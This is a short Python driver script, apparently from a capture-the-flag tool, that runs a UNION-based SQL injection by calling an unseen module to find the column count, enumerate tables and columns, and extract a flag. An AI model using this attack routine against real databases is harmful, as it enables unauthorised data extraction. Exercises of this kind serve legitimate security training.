import union_based

def try_union_based():
    print("\n=== Trying UNION-based SQLi ===")
    total_columns = union_based.find_column_count()
    if total_columns is None:
        print("[-] Couldn't find column count")
        return False

    visible_col = union_based.find_visible_column(total_columns)
    if visible_col is None:
        print("[-] Couldn't find column count")
        return False

    table = union_based.get_tables(total_columns, visible_col)
    if table is None:
        print("[-] No table found. Exiting.")
        return False

    column = union_based.get_columns(total_columns, visible_col, table) 
    flag = union_based.get_flag(total_columns, visible_col, table, column)
    
    if flag is None:
        print("[-] No flag found. Exiting.")
        return False
    
    return True
